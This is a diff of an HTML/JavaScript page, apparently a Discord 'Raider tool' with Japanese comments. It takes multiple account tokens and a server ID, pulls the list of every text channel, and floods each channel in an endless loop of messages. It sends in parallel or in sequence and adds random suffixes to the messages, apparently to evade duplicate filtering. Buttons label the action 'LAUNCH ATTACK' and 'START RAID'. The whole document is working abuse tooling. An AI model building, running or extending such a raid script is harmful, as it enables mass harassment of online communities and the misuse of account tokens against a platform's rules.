@@ -3,48 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Raider Terminal</title>
+    <title>Raider tool</title>
     <style>
         :root {
-            /* グラデーションパレット */
             --main-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             --danger-gradient: linear-gradient(135deg, #ff5f6d 0%, #ffc371 100%);
-            --bg-dark: #0f0c29; /* 深みのある紺色 */
+            --bg-dark: #0f0c29;
             --card-bg: rgba(30, 30, 50, 0.95);
             --input-bg: rgba(0, 0, 0, 0.3);
             --text-color: #ffffff;
             --radius: 20px;
         }
 
-        /* 背景にグラデーションを適用し、スクロールを可能にする */
         body {
             background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
             color: var(--text-color);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             margin: 0;
-            padding: 40px 20px; /* 上下に余白 */
+            padding: 40px 20px;
             display: flex;
             justify-content: center;
             min-height: 100vh;
-            overflow-y: auto; /* 下へのスクロールを許可 */
+            overflow-y: auto;
             box-sizing: border-box;
         }
 
-        /* メインカード：少し透明にして高級感を出す */
         .card {
             background: var(--card-bg);
             width: 100%;
-            max-width: 500px;
+            max-width: 550px;
             padding: 40px;
             border-radius: var(--radius);
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            backdrop-filter: blur(10px); /* 背景をぼかす */
+            backdrop-filter: blur(10px);
             border: 1px solid rgba(255,255,255,0.1);
-            height: fit-content; /* 中身の高さに合わせる */
         }
 
         h1 {
-            font-size: 26px;
+            font-size: 28px;
             text-align: center;
             margin-bottom: 30px;
             background: var(--main-gradient);
@@ -53,182 +49,191 @@
             font-weight: 800;
         }
 
-        .form-group { margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 12px; font-weight: 600; color: #aaa; margin-bottom: 8px; letter-spacing: 1px; }
 
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #aaa;
-            margin-bottom: 10px;
-            letter-spacing: 1px;
-        }
-
-        textarea, input {
+        textarea, input, select {
             width: 100%;
             background: var(--input-bg);
             border: 1px solid rgba(255,255,255,0.1);
             border-radius: 12px;
             color: white;
-            padding: 15px;
+            padding: 12px;
             box-sizing: border-box;
             outline: none;
-            transition: 0.3s;
         }
 
-        textarea:focus, input:focus {
-            border-color: #667eea;
-            box-shadow: 0 0 15px rgba(102, 126, 234, 0.3);
-        }
+        .row { display: flex; gap: 10px; }
+        .row input { flex: 2; }
+        .row button { flex: 1; padding: 10px; font-size: 11px; margin-top: 8px; border-radius: 10px; }
 
-        /* ボタン：グラデーションとアニメーション */
         .controls { display: flex; gap: 15px; margin-top: 30px; }
-
         button {
             flex: 1;
-            padding: 18px;
+            padding: 15px;
             border: none;
             border-radius: 15px;
             font-weight: bold;
             color: white;
             cursor: pointer;
             transition: all 0.2s ease;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
 
-        .btn-start {
-            background: var(--main-gradient);
-        }
+        .btn-start { background: var(--main-gradient); }
+        .btn-stop { background: var(--danger-gradient); }
+        .btn-fetch { background: #4a4a6a; }
 
-        .btn-stop {
-            background: var(--danger-gradient);
-        }
+        button:hover { transform: translateY(-2px); filter: brightness(1.1); }
+        button:active { transform: translateY(1px); }
 
-        /* クリックした時の「押し込んだ感じ」 */
-        button:hover {
-            transform: translateY(-3px);
-            filter: brightness(1.1);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
-        }
-
-        button:active {
-            transform: translateY(1px);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-        }
-
-        /* ログエリア：中身が増えてもスクロール可能 */
         #console {
-            margin-top: 30px;
+            margin-top: 25px;
             height: 150px;
             background: rgba(0,0,0,0.4);
             border-radius: 15px;
             padding: 15px;
-            font-family: 'Consolas', monospace;
-            font-size: 12px;
+            font-family: monospace;
+            font-size: 11px;
             overflow-y: auto;
-            border: 1px solid rgba(255,255,255,0.05);
         }
-
-        .log-entry { margin-bottom: 5px; border-left: 3px solid #667eea; padding-left: 8px; }
-        .log-error { border-left-color: #ff5f6d; color: #ff5f6d; }
+        .log-entry { margin-bottom: 4px; border-left: 3px solid #667eea; padding-left: 8px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>PREMIUM RAIDER</h1>
+    <h1>Raider tool</h1>
 
     <div class="form-group">
         <label>DISCORD TOKENS</label>
-        <textarea id="tokens" rows="4" placeholder="トークンを貼り付け..."></textarea>
+        <textarea id="tokens" rows="3" placeholder="1つ目のトークンをメインに使用してチャンネルを取得します"></textarea>
     </div>
 
     <div class="form-group">
-        <label>CHANNEL ID</label>
-        <input type="text" id="channelId" placeholder="IDを入力">
+        <label>SERVER ID & FETCH CHANNELS</label>
+        <div class="row">
+            <input type="text" id="serverId" placeholder="サーバーIDを入力">
+            <button class="btn-fetch" id="fetchChannels">GET CHANNELS</button>
+        </div>
     </div>
 
     <div class="form-group">
-        <label>MESSAGE (Use \n for lines)</label>
-        <textarea id="message" rows="2" placeholder="メッセージを入力"></textarea>
+        <label>TARGET CHANNEL IDs (Comma separated)</label>
+        <textarea id="channelIds" rows="2" placeholder="自動取得するか、直接入力"></textarea>
     </div>
 
     <div class="form-group">
-        <label>DELAY (ms)</label>
-        <input type="number" id="delay" value="0">
+        <label>MESSAGE (Use \n for new lines)</label>
+        <textarea id="message" rows="2" placeholder="メッセージ"></textarea>
+    </div>
+
+    <div class="row">
+        <div class="form-group" style="flex: 1;">
+            <label>MODE</label>
+            <select id="mode">
+                <option value="parallel">Parallel (一斉送信)</option>
+                <option value="sequential">Sequential (1人ずつ順番)</option>
+            </select>
+        </div>
+        <div class="form-group" style="flex: 1;">
+            <label>DELAY (ms)</label>
+            <input type="number" id="delay" value="1000">
+        </div>
     </div>
 
     <div class="controls">
-        <button id="start" class="btn-start">LAUNCH ATTACK</button>
+        <button id="start" class="btn-start">START RAID</button>
         <button id="stop" class="btn-stop">STOP</button>
     </div>
 
-    <div id="console">
-        <div class="log-entry">System ready...</div>
-    </div>
+    <div id="console"><div class="log-entry">Waiting for input...</div></div>
 </div>
 
 <script>
     let isRunning = false;
     const consoleDiv = document.getElementById('console');
 
-    function log(msg, isError = false) {
+    function log(msg) {
         const div = document.createElement('div');
-        div.className = `log-entry ${isError ? 'log-error' : ''}`;
+        div.className = 'log-entry';
         div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
         consoleDiv.prepend(div);
     }
 
     const randomStr = () => Math.random().toString(36).substring(2, 8);
 
-    async function fire(token, channelId, message, delay) {
-        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
-        while (isRunning) {
-            const content = `${message} | ${randomStr()}`;
-            try {
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': token.trim(),
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content, tts: false })
-                });
+    // チャンネル自動取得機能
+    document.getElementById('fetchChannels').onclick = async () => {
+        const token = document.getElementById('tokens').value.split('\n')[0].trim();
+        const serverId = document.getElementById('serverId').value.trim();
+        if (!token || !serverId) return alert("一番上のトークンとサーバーIDが必要です");
 
-                if (res.ok) {
-                    log(`SUCCESS: ${token.substring(0, 8)}...`);
-                } else if (res.status === 429) {
-                    const data = await res.json();
-                    log(`RATELIMIT: ${data.retry_after}s`, true);
-                    await new Promise(r => setTimeout(r, data.retry_after * 1000));
-                } else {
-                    log(`FAILED: ${res.status}`, true);
-                }
-            } catch (e) {
-                log("CORS/Network Error", true);
-            }
-            if (delay > 0) await new Promise(r => setTimeout(r, delay));
-            else await new Promise(r => setTimeout(r, 50)); 
+        log("Fetching channels...");
+        try {
+            const res = await fetch(`https://discord.com/api/v9/guilds/${serverId}/channels`, {
+                headers: { 'Authorization': token }
+            });
+            const channels = await res.json();
+            // テキストチャンネルかつ、メッセージ送信権限の確認（簡易フィルタ）
+            const targetIds = channels
+                .filter(c => c.type === 0) 
+                .map(c => c.id);
+            
+            document.getElementById('channelIds').value = targetIds.join(',');
+            log(`${targetIds.length}個のチャンネルを取得しました`);
+        } catch (e) {
+            log("取得失敗。IDやトークンを確認してください");
         }
+    };
+
+    async function postMsg(token, channelId, content) {
+        return fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+            method: 'POST',
+            headers: { 'Authorization': token, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content, tts: false })
+        });
     }
 
-    document.getElementById('start').onclick = () => {
+    document.getElementById('start').onclick = async () => {
         if (isRunning) return;
-        const tokens = document.getElementById('tokens').value.split('\n').filter(t => t.trim() !== '');
-        const channelId = document.getElementById('channelId').value.trim();
-        const message = document.getElementById('message').value.replace(/\\n/g, '\n');
+        const tokens = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
+        const channelIds = document.getElementById('channelIds').value.split(',').filter(id => id.trim());
+        const msgBase = document.getElementById('message').value.replace(/\\n/g, '\n');
+        const mode = document.getElementById('mode').value;
         const delay = parseInt(document.getElementById('delay').value);
 
-        if (!tokens.length || !channelId) return alert("入力が足りません");
+        if (!tokens.length || !channelIds.length) return alert("設定が不完全です");
 
         isRunning = true;
-        log("Attack initiated.");
-        tokens.forEach(t => fire(t, channelId, message, delay));
+        log(`Raid Started (${mode} mode)`);
+
+        while (isRunning) {
+            for (const channelId of channelIds) {
+                if (!isRunning) break;
+                
+                const fullMsg = `${msgBase} | ${randomStr()}`;
+
+                if (mode === 'parallel') {
+                    // 全トークンが並行して送信
+                    await Promise.all(tokens.map(t => postMsg(t.trim(), channelId.trim(), fullMsg)));
+                    log(`Parallel sent to ${channelId}`);
+                } else {
+                    // 1つずつ順番に送信
+                    for (const token of tokens) {
+                        if (!isRunning) break;
+                        await postMsg(token.trim(), channelId.trim(), fullMsg);
+                        log(`Sent: ${token.substring(0, 8)}...`);
+                    }
+                }
+            }
+            if (delay > 0) await new Promise(r => setTimeout(r, delay));
+            else await new Promise(r => setTimeout(r, 50));
+        }
     };
 
     document.getElementById('stop').onclick = () => {
         isRunning = false;
-        log("Attack stopped.", true);
+        log("Stopped.");
     };
 </script>
 
